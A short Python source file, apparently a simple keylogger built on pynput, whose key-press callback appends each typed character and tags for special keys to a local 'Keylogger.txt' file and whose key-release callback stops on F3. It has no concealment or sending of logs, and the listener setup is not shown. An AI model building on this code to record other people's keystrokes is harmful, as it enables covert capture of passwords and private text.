from pynput.keyboard import Key


def key_down(key):
    log = open('Keylogger.txt', mode='a')
    try:
        log.write(key.char)
    except AttributeError:  # Special keys
        if key == Key.space:
            log.write(' ')
        elif key == Key.backspace:
            log.write(' <bkp> ')
        elif key == Key.shift:
            log.write(' <shift> ')
        elif key == Key.ctrl_l:
            log.write(' <ctrl_l> ')
        elif key == Key.enter:
            log.write(' <enter> \n')
        else:
            log.write(f' <{key}> ')


def key_up(key):
    if key == Key.f3:  # Hotkey to end process
        return False
